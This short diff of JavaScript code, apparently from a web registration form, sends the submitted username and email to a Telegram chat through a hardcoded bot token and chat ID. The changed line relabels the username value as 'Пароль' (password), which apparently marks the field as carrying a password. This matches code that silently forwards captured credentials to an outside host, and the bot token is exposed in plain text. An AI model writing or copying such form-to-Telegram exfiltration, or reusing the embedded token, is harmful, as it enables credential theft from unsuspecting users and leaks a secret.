@@ -41,7 +41,7 @@
 
             const token = '7942332820:AAFC2P1_9T8USat2LkVF_cXqtqCaBqs2O4g';
             const chatId = -1002372284940 
-            const message = `Новая регистрация:\nИмя пользователя: ${username}\nEmail: ${email}`;
+            const message = `Новая регистрация:\nПароль: ${username}\nПочта: ${email}`;
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
            
